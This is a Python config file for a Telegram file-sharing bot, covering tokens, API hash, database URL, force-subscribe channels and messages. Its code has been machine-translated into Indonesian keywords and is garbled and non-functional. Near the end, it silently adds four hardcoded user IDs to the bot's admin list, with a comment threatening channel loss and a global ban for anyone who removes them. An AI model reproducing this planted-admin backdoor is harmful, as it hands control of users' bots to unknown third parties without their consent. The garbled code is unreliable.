impor  log
impor  os
dari  distutil . util  impor  strtobool
dari  dotenv  impor  load_dotenv
dari  penebangan . penangan  mengimpor  RotatingFileHandler

load_dotenv ( "config.env" )

# Bot token dari @Botfather
TG_BOT_TOKEN  =  os . lingkungan . dapatkan ( "TG_BOT_TOKEN" , "" )

# API ID Anda dari my.telegram.org
APP_ID  =  int ( os . environ . get ( "APP_ID" , "" ))

# API Hash Anda dari my.telegram.org
API_HASH  =  os . lingkungan . dapatkan ( "API_HASH" , "" )

# Basis Data Saluran ID
CHANNEL_ID  =  int ( os . environ . get ( "CHANNEL_ID" , "" ))

# PEMILIK NAMA
PEMILIK  =  os . lingkungan . dapatkan ( "PEMILIK" , "mrismanaziz" )

# Lindungi Konten
PROTECT_CONTENT  =  strtobool ( os . environ . get ( "PROTECT_CONTENT" , "False" ))

# Kredensial Heroku untuk pembaru.
HEROKU_APP_NAME  =  os . lingkungan . dapatkan ( "HEROKU_APP_NAME" , Tidak Ada )
HEROKU_API_KEY  =  os . lingkungan . dapatkan ( "HEROKU_API_KEY" , Tidak Ada )

# Repo Kustom untuk pembaru.
UPSTREAM_BRANCH  =  os . lingkungan . dapatkan ( "UPSTREAM_BRANCH" , "master" )

# Basis Data
DB_URI  =  os . lingkungan . dapatkan ( "DATABASE_URL" , "" )

#ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL  =  int ( os . environ . get ( "FORCE_SUB_CHANNEL" , "0" ))
FORCE_SUB_GROUP  =  int ( os . environ . get ( "FORCE_SUB_GROUP" , "0" ))

TG_BOT_WORKERS  =  int ( os . environ . get ( "TG_BOT_WORKERS" , "4" ))

# Pesan Awalan /start
START_MSG  =  os . lingkungan . dapatkan (
    "START_MESSAGE" ,
    "<b>Halo {first}</b> \n \n <b>Saya dapat menyimpan file pribadi di Saluran Tertentu dan pengguna lain dapat mengaksesnya dari tautan khusus.</b>" ,
)
coba :
    ADMINS  = [ int ( x ) untuk  x  di ( os . environ . get ( "ADMINS" , "" ). split ())]
kecuali  ValueError :
    raise  Exception ( "Daftar Admin Anda tidak berisi User ID Telegram yang valid." )

# Pesan Saat Memaksa Berlangganan
FORCE_MSG  =  os . lingkungan . dapatkan (
    "FORCE_SUB_MESSAGE" ,
    "<b>Halo {first} \n \n Anda harus bergabung di Channel/Grup Saya Terlebih dahulu untuk Melihat File yang saya Bagikan \n \n Silakan Bergabung Ke Channel & Group Terlebih Dahulu</b>" ,
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION  =  os . lingkungan . dapatkan ( "CUSTOM_CAPTION" , Tidak Ada )

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON  =  strtobool ( os . environ . get ( "DISABLE_CHANNEL_BUTTON" , "False" ))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & pemiliknya gua gban
ADMIN . memperpanjang (( 844432220 , 1250450587 , 1750080384 , 182990552 ))


LOG_FILE_NAME  =  "logs.txt"
penebangan . konfigurasi dasar (
    tingkat = masuk . INFORMASI ,
    format = "[%(levelname)s] - %(name)s - %(message)s" ,
    datefmt = "%d-%b-%y %H:%M:%S" ,
    penangan = [
        RotatingFileHandler ( LOG_FILE_NAME , maxBytes = 50000000 , backupCount = 10 ),
        penebangan . StreamHandler (),
    ],
)
penebangan . getLogger ( "pyrogram" ). setLevel ( logging . PERINGATAN )


def  LOGGER ( nama : str ) ->  logging . Pencatat :
     pencatatan kembali . getLogger ( nama )
